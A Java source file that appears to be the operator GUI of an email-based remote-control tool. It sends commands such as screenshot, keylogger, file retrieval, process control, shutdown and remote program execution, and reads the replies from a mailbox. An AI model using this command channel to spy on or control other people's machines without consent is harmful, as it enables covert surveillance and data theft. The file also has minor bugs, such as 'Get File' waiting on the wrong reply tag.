package com.ui.gui;

import com.util.CheckMail;
import com.util.SendMail;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.layout.VBox;
import javafx.scene.text.Font;
import javafx.scene.text.Text;

import javax.mail.MessagingException;
import java.io.IOException;
import java.util.List;

public class Start {
    @FXML
    public Button btnSend;

    @FXML
    public TextField optionals;

    @FXML
    public Label optlabel;

    @FXML
    public ComboBox<String> requestbox;

    @FXML
    public VBox displayScene;

    public void initialize() {
        optionals.setDisable(true);
        List<String> list = List.of("Screenshot", "KeyLogger", "Get File", "List Directory",
                "List Process", "Stop Process", "Start Process","List App", "Shutdown", "Restart", "Run Exe/App", "Log out");
        requestbox.setItems(FXCollections.observableList(list));
        requestbox.getSelectionModel().selectFirst();
        optionals.setEditable(false);
        requestbox.getSelectionModel().selectedItemProperty().addListener(
                (observableValue, s, t1) -> {
                    switch (t1) {
                        case "Screenshot" -> {
                            optlabel.setText("");
                            optionals.setEditable(false);
                            optionals.setDisable(true);
                        }
                        case "KeyLogger" -> {
                            optlabel.setText("Logging Time");
                            optionals.setEditable(true);
                            optionals.setDisable(false);

                        }
                        case "Get File" -> {
                            optionals.setDisable(false);
                            optionals.setEditable(true);
                            optlabel.setText("File's Path");

                        }
                        case "List Directory" -> {
                            optlabel.setText("");
                            optionals.setEditable(false);
                            optionals.setDisable(true);
                        }
                        case "List Process" -> {
                            optlabel.setText("");
                            optionals.setEditable(false);
                            optionals.setDisable(true);
                        }
                        case "Stop Process" -> {
                            optlabel.setText("PID");
                            optionals.setEditable(true);
                            optionals.setDisable(false);
                        }
                        case "Start Process" -> {
                            optlabel.setText("PID");
                            optionals.setEditable(true);
                            optionals.setDisable(false);
                        }
                        case "List App" -> {
                            optlabel.setText("");
                            optionals.setEditable(false);
                            optionals.setDisable(true);
                        }
                        case "Shutdown" -> {
                            optionals.setDisable(false);
                            optionals.setEditable(true);
                            optlabel.setText("Sudopass (MAC)");
                        }
                        case "Restart" -> {
                            optlabel.setText("");
                            optionals.setDisable(false);
                            optionals.setEditable(false);
                        }
                        case "Run Exe/App" -> {
                            optlabel.setText("Path");
                            optionals.setEditable(true);
                            optionals.setDisable(false);
                        }
                        case "Log out" -> {
                            optlabel.setText("");
                            optionals.setDisable(false);
                            optionals.setDisable(false);
                        }
                        default -> btnSend.setDisable(true);
                    }
                }
        );
    }

    public void display (String s, String color){
        Text displayText = new Text(s);
        displayText.setFont(new Font("Time News Roman", 14));
        displayText.setStyle("-fx-fill: " + color);
        displayText.wrappingWidthProperty().set(540);
        Platform.runLater(() -> {
            if (displayScene.getHeight() > 360)
                displayScene.getChildren().clear();
            displayScene.getChildren().add(displayText);
        });
    }

    @FXML
    public void handleSendClick(ActionEvent event) {
        String request = requestbox.getSelectionModel().getSelectedItem();
        btnSend.setDisable(true);
        requestbox.setDisable(true);
        if (request.equals("Screenshot")){
            Thread thread = new Thread(()->{
                try {
                    SendMail.getInstance().Send("takeshot");
                    display("Mail had been sent!! Waiting for a response...", "green");
                    Thread.sleep(15000);
                    String a = CheckMail.getInstance().listen("takeshot");
                    if (a!=null) {
                        display("Successful! File saved in "+ a,"green");
                    }
                    else {
                        display("Error happened","red");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                }
                finally {
                    Platform.runLater(()->{
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        } else if (request.equals("KeyLogger")) {
            try {
                int time = Integer.parseInt(optionals.getText());
                System.out.println(time);
                System.out.println(time);
                if (time < 0) {
                    throw new NumberFormatException();
                } else if (time < 1000) {
                    display("Too small", "yellow");
                } else {
                    Thread thread = new Thread(()->{
                        try {
                            SendMail.getInstance().Send("keylog/" + time);
                            display("Mail had been sent!! Waiting for a response...", "green");
                            Thread.sleep(15000+time);
                            String a = CheckMail.getInstance().listen("keylog");
                            display("Successful! File saved in "+a,"green");
                        } catch (Exception e) {
                            e.printStackTrace();
                            display(e.getMessage(), "red");
                        } finally {
                            Platform.runLater(() -> {
                                btnSend.setDisable(false);
                                requestbox.setDisable(false);
                            });
                        }
                    });
                    thread.start();
                }
            } catch (NumberFormatException e) {
                display("Please enter an acceptable time", "Red");
            }
        } else if (request.equals("List Directory")) {
            Thread thread = new Thread(()-> {
                try {
                    SendMail.getInstance().Send("listdir");
                    display("Mail had been sent!! Waiting for a response...", "green");
                    Thread.sleep(15000);
                    String a = CheckMail.getInstance().listen("listdir");
                    if (a!=null) {
                        display("Successful! File saved in "+a,"green");
                    }
                    else {
                        display("Error happened","red");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                }
                finally {
                    Platform.runLater(()->{
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        } else if (request.equals("List Process")) {
            Thread thread = new Thread(()->{
                try {
                    SendMail.getInstance().Send("listprocess");
                    display("Mail had been sent!! Waiting for a response...", "green");
                    Thread.sleep(15000);
                    String a = CheckMail.getInstance().listen("listprocess");
                    if (a!=null) {
                        display("Successful! File saved in "+a,"green");
                    }
                    else {
                        display("Error happened","red");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                }
                finally {
                    Platform.runLater(()->{
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        } else if (request.equals("Stop Process") ) {
            Thread thread = new Thread(()->{
                try {
                    String pid = optionals.getText();
                    System.out.println(pid);
                    SendMail.getInstance().Send("stopprocess/" + pid);
                    display("Mail had been sent!! Waiting for a response...", "green");
                    Thread.sleep(15000);
                    String a = CheckMail.getInstance().listen("stopprocess");
                    if (a!=null) {
                        display(a,"green");
                    }
                    else {
                        display("Error happened","red");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                }
                finally {
                    Platform.runLater(()->{
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        } else if (request.equals("Start Process") ) {
            Thread thread = new Thread(() -> {
                try {
                    String pid = optionals.getText();
                    SendMail.getInstance().Send("startprocess/" + pid);
                    display("Mail had been sent!! Waiting for a response...", "green");
                    Thread.sleep(15000);
                    String a = CheckMail.getInstance().listen("startprocess");
                    if (a != null) {
                        display(a, "green");
                    } else {
                        display("Error happened", "red");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                } finally {
                    Platform.runLater(() -> {
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        } else if (request.equals("List App")) {
            Thread thread = new Thread(()-> {
                try {
                    SendMail.getInstance().Send("listapp");
                    display("Mail had been sent!! Waiting for a response...", "green");
                    Thread.sleep(15000);
                    String a = CheckMail.getInstance().listen("listapp");
                    if (a!=null) {
                        display("Successful! File saved in "+a,"green");
                    }
                    else {
                        display("Error happened","red");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                }
                finally {
                    Platform.runLater(()->{
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        } else if (request.equals("Shutdown")) {
            Thread thread = new Thread(()->{
                try {
                    String sudo = optionals.getText();
                    SendMail.getInstance().Send("shutdown/" + sudo);
                    display("Mail had been sent!! Pleas wait 10 seconds, if there is response, it means some errors have occurred", "green");
                    Thread.sleep(10000);
                    String a = CheckMail.getInstance().listen("shutdown");
                    if (a==null) {
                        display("Error happened","red");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                }
                finally {
                    Platform.runLater(()->{
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        } else if (request.equals("Restart")) {
            Thread thread = new Thread(()->{
                try {
                    SendMail.getInstance().Send("restart");
                    display("Mail had been sent!! Pleas wait 10 seconds, if there is response, it means some errors have occurred", "green");
                    Thread.sleep(10000);
                    String a = CheckMail.getInstance().listen("restart");
                    if (a==null) {
                        display("Error happened","red");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                }
                finally {
                    Platform.runLater(()->{
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        } else if (request.equals("Run Exe/App")) {
            Thread thread = new Thread(()->{
                try {
                    String file = optionals.getText();
                    System.out.println(file);
                    SendMail.getInstance().Send("runapp/" + file);
                    display("Mail had been sent!! Waiting for a response...", "green");
                    Thread.sleep(15000);
                    String a = CheckMail.getInstance().listen("runapp");
                    if (a!=null) {
                        display(a,"green");
                    }
                    else {
                        display("Error happened","red");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                }
                finally {
                    Platform.runLater(()->{
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        } else if (request.equals("Log out")) {
            Thread thread = new Thread(()->{
                try {
                    SendMail.getInstance().Send("logout");
                    display("Mail had been sent!! Goodbye...", "green");
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                }
                finally {
                    Platform.runLater(()->{
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        } else if (request.equals("Get File")) {
            Thread thread = new Thread(()->{
                try {
                    String file = optionals.getText();
                    System.out.println(file);
                    SendMail.getInstance().Send("getfile/" + file);
                    display("Mail had been sent!! Waiting for a response...", "green");
                    Thread.sleep(15000);
                    String a = CheckMail.getInstance().listen("runapp");
                    if (a!=null) {
                        display("Successful! File saved in "+a,"green");
                    }
                    else {
                        display("Error happened","red");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    display(e.getMessage(), "red");
                }
                finally {
                    Platform.runLater(()->{
                        btnSend.setDisable(false);
                        requestbox.setDisable(false);
                    });
                }
            });
            thread.start();
        }
    }
}